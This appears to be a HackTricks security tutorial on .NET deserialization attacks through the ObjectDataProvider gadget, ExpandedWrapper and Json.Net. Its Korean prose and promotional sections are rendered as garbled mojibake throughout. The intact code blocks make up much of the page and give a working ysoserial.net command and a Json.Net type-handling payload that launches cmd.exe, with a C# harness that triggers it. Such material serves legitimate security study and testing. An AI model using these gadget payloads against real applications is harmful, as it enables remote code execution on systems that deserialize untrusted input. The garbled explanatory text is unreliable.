# ê¸°ë³¸ .Net ì—­ì§ë ¬í™” (ObjectDataProvider ê°€ì ¯, ExpandedWrapper ë° Json.Net)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤**í•˜ê±°ë‚˜ HackTricksë¥¼ **PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks) ë° [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

ì´ ê²Œì‹œë¬¼ì€ **ObjectDataProvider ê°€ì ¯ì„ ì•…ìš©í•˜ì—¬ RCEë¥¼ ì–»ëŠ” ë°©ë²•**ê³¼ Serialization ë¼ì´ë¸ŒëŸ¬ë¦¬ **Json.Net ë° xmlSerializerê°€ í•´ë‹¹ ê°€ì ¯ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•**ì„ ì´í•´í•˜ëŠ” ë° ì£¼ì•ˆì ì„ ë‘ê³  ìˆìŠµë‹ˆë‹¤.

## ObjectDataProvider ê°€ì ¯

ë¬¸ì„œì—ì„œëŠ” _ObjectDataProvider í´ë˜ìŠ¤ê°€ ë°”ì¸ë”© ì†ŒìŠ¤ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê°œì²´ë¥¼ ë˜í•‘í•˜ê³  ìƒì„±í•œë‹¤_ê³  ì„¤ëª…í•˜ê³  ìˆìŠµë‹ˆë‹¤.\
ê·¸ë˜, ì´í•´í•˜ê¸° ì–´ë ¤ìš´ ì„¤ëª…ì´ë‹ˆê¹Œ ì´ í´ë˜ìŠ¤ê°€ ì™œ í¥ë¯¸ë¡œìš´ì§€ ì‚´í´ë³´ì£ : ì´ í´ë˜ìŠ¤ëŠ” **ì„ì˜ì˜ ê°œì²´ë¥¼ ë˜í•‘**í•  ìˆ˜ ìˆìœ¼ë©°, _**MethodParameters**_ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì„ì˜ì˜ ë§¤ê°œë³€ìˆ˜ë¥¼ ì„¤ì •**í•˜ê³ , ê·¸ëŸ° ë‹¤ìŒ ì„ì˜ì˜ ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„ ì–¸ëœ ì„ì˜ì˜ ê°œì²´ì˜ ì„ì˜ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ, ì„ì˜ì˜ **ê°œì²´**ê°€ **ì—­ì§ë ¬í™”**ë˜ëŠ” ë™ì•ˆ **ë§¤ê°œë³€ìˆ˜ì™€ í•¨ê»˜ í•¨ìˆ˜ë¥¼ ì‹¤í–‰**í•©ë‹ˆë‹¤.

### **ì–´ë–»ê²Œ ê°€ëŠ¥í•œê°€ìš”**

ObjectDataProviderê°€ ì •ì˜ë˜ê³  êµ¬í˜„ëœ **PresentationFramework.dll** ë‚´ì˜ **System.Windows.Data** ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ í´ë˜ìŠ¤ì˜ ì½”ë“œë¥¼ **[dnSpy](https://github.com/0xd4d/dnSpy)**ë¥¼ ì‚¬ìš©í•˜ì—¬ ê²€ì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ì´ë¯¸ì§€ì—ì„œ ìš°ë¦¬ê°€ ê´€ì‹¬ ìˆëŠ” í´ë˜ìŠ¤ì¸ **PresentationFramework.dll --> System.Windows.Data --> ObjectDataProvider --> Method name**ì˜ ì½”ë“œë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (299).png>)

`MethodName`ì´ ì„¤ì •ë˜ë©´ `base.Refresh()`ê°€ í˜¸ì¶œë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì œ ì´ í•¨ìˆ˜ê°€ ë¬´ì—‡ì„ í•˜ëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (300).png>)

ê·¸ëŸ¼ `this.BeginQuery()`ê°€ ë¬´ì—‡ì„ í•˜ëŠ”ì§€ ê³„ì† ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. `BeginQuery`ëŠ” `ObjectDataProvider`ì—ì„œ ì¬ì •ì˜ë˜ë©° ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

![](<../../.gitbook/assets/image (301).png>)

ì½”ë“œì˜ ëì—ì„œ `this.QueryWorke(null)`ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì œ ì´ê²ƒì´ ë¬´ì—‡ì„ ì‹¤í–‰í•˜ëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (302) (1).png>)

ì´ê²ƒì€ `QueryWorker` í•¨ìˆ˜ì˜ ì „ì²´ ì½”ë“œëŠ” ì•„ë‹ˆì§€ë§Œ, í¥ë¯¸ë¡œìš´ ë¶€ë¶„ì„ ë³´ì—¬ì¤ë‹ˆë‹¤: ì½”ë“œëŠ” `this.InvokeMethodOnInstance(out ex);`ë¥¼ í˜¸ì¶œí•˜ëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤. ì´ ë¶€ë¶„ì—ì„œ **ì„¤ì •ëœ ë©”ì„œë“œê°€ í˜¸ì¶œ**ë©ë‹ˆë‹¤.

`MethodName`ë§Œ ì„¤ì •í•˜ë©´ ì‹¤í–‰ëœë‹¤ëŠ” ê²ƒì„ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
using System.Windows.Data;
using System.Diagnostics;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ObjectDataProvider myODP = new ObjectDataProvider();
myODP.ObjectType = typeof(Process);
myODP.MethodParameters.Add("cmd.exe");
myODP.MethodParameters.Add("/c calc.exe");
myODP.MethodName = "Start";
}
}
}
```
ì°¸ê³ ë¡œ, `System.Windows.Data`ë¥¼ ë¡œë“œí•˜ê¸° ìœ„í•´ _C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll_ì„ ì°¸ì¡°ë¡œ ì¶”ê°€í•´ì•¼ í•©ë‹ˆë‹¤.

## ExpandedWrapper

ì´ì „ ê³µê²©ì„ ì‚¬ìš©í•˜ë©´ **ê°ì²´**ê°€ _**ObjectDataProvider**_ ì¸ìŠ¤í„´ìŠ¤ë¡œ **ì—­ì§ë ¬í™”ë  ìˆ˜ ìˆëŠ” ê²½ìš°**ê°€ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: DotNetNuke ì·¨ì•½ì ì—ì„œ XmlSerializerë¥¼ ì‚¬ìš©í•˜ì—¬ ê°ì²´ê°€ `GetType`ì„ ì‚¬ìš©í•˜ì—¬ ì—­ì§ë ¬í™”ë˜ì—ˆìŠµë‹ˆë‹¤). ê·¸ëŸ° ë‹¤ìŒ, _ObjectDataProvider_ ì¸ìŠ¤í„´ìŠ¤ì— **ê°ì‹¸ì§„ ê°ì²´ ìœ í˜•ì— ëŒ€í•œ ì •ë³´ê°€ ì—†ìŠµë‹ˆë‹¤** (`Process` ì˜ˆë¥¼ ë“¤ì–´). [DotNetNuke ì·¨ì•½ì ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤](https://translate.google.com/translate?hl=en\&sl=auto\&tl=en\&u=https%3A%2F%2Fpaper.seebug.org%2F365%2F\&sandbox=1).

ì´ í´ë˜ìŠ¤ëŠ” ì£¼ì–´ì§„ ì¸ìŠ¤í„´ìŠ¤ì— **ìº¡ìŠí™”ëœ ê°ì²´ ìœ í˜•ì„ ì§€ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ í´ë˜ìŠ¤ëŠ” ì†ŒìŠ¤ ê°ì²´ (_ObjectDataProvider_)ë¥¼ ìƒˆë¡œìš´ ê°ì²´ ìœ í˜•ìœ¼ë¡œ ìº¡ìŠí™”í•˜ê³  í•„ìš”í•œ ì†ì„± (_ObjectDataProvider.MethodName_ ë° _ObjectDataProvider.MethodParameters_)ì„ ì œê³µí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ì „ì— ì œì‹œëœ ê²½ìš°ì™€ ê°™ì€ ê²½ìš°ì— ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ ìš°ë¦¬ëŠ” _ObjectDataProvider_ë¥¼ _ExpandedWrapper_ ì¸ìŠ¤í„´ìŠ¤ ì•ˆì— **ê°ì‹¸ê³ **, ì´ í´ë˜ìŠ¤ê°€ **ì—­ì§ë ¬í™”ë  ë•Œ** _MethodName_ì— ì§€ì •ëœ **í•¨ìˆ˜ë¥¼ ì‹¤í–‰**í•˜ëŠ” _ObjectDataProvider_ ê°ì²´ë¥¼ **ìƒì„±**í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ë‹¤ìŒ ì½”ë“œë¡œ ì´ ë˜í¼ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
using System.Windows.Data;
using System.Diagnostics;
using System.Data.Services.Internal;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
myExpWrap.ProjectedProperty0.ObjectInstance = new Process();
myExpWrap.ProjectedProperty0.MethodParameters.Add("cmd.exe");
myExpWrap.ProjectedProperty0.MethodParameters.Add("/c calc.exe");
myExpWrap.ProjectedProperty0.MethodName = "Start";
}
}
}
```
## Json.Net

[ê³µì‹ ì›¹ í˜ì´ì§€](https://www.newtonsoft.com/json)ì—ì„œëŠ” ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ Json.NETì˜ ê°•ë ¥í•œ JSON ì§ë ¬í™”ê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ **ëª¨ë“  .NET ê°ì²´ë¥¼ ì§ë ¬í™” ë° ì—­ì§ë ¬í™”** í•  ìˆ˜ ìˆë‹¤ê³  ì„¤ëª…í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ë§Œì•½ ìš°ë¦¬ê°€ **ObjectDataProvider ê°€ì ¯ì„ ì—­ì§ë ¬í™”**í•  ìˆ˜ ìˆë‹¤ë©´, ê°ì²´ë¥¼ ì—­ì§ë ¬í™”í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œë„ **ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE)**ë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Json.Net ì˜ˆì œ

ë¨¼ì € ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°ì²´ë¥¼ **ì§ë ¬í™”/ì—­ì§ë ¬í™”**í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì˜ˆì œë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:
```java
using System;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Collections.Generic;

namespace DeserializationTests
{
public class Account
{
public string Email { get; set; }
public bool Active { get; set; }
public DateTime CreatedDate { get; set; }
public IList<string> Roles { get; set; }
}
class Program
{
static void Main(string[] args)
{
Account account = new Account
{
Email = "james@example.com",
Active = true,
CreatedDate = new DateTime(2013, 1, 20, 0, 0, 0, DateTimeKind.Utc),
Roles = new List<string>
{
"User",
"Admin"
}
};
//Serialize the object and print it
string json = JsonConvert.SerializeObject(account);
Console.WriteLine(json);
//{"Email":"james@example.com","Active":true,"CreatedDate":"2013-01-20T00:00:00Z","Roles":["User","Admin"]}

//Deserialize it
Account desaccount = JsonConvert.DeserializeObject<Account>(json);
Console.WriteLine(desaccount.Email);
}
}
}
```
### Json.Net ë‚¨ìš©

[ysoserial.net](https://github.com/pwntester/ysoserial.net)ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒê³¼ ê°™ì€ ì•…ìš©ì„ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤:
```java
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
ì´ ì½”ë“œì—ì„œëŠ” **exploitì„ í…ŒìŠ¤íŠ¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‹¤í–‰í•˜ë©´ calcê°€ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```java
using System;
using System.Text;
using Newtonsoft.Json;

namespace DeserializationTests
{
class Program
{
static void Main(string[] args)
{
//Declare exploit
string userdata = @"{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
//Exploit to base64
string userdata_b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userdata));

//Get data from base64
byte[] userdata_nob64 = Convert.FromBase64String(userdata_b64);
//Deserialize data
string userdata_decoded = Encoding.UTF8.GetString(userdata_nob64);
object obj = JsonConvert.DeserializeObject<object>(userdata_decoded, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
}
}
}
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ì•„ë‹ˆë©´ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)ì™€ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•´ì£¼ì„¸ìš”.

</details>
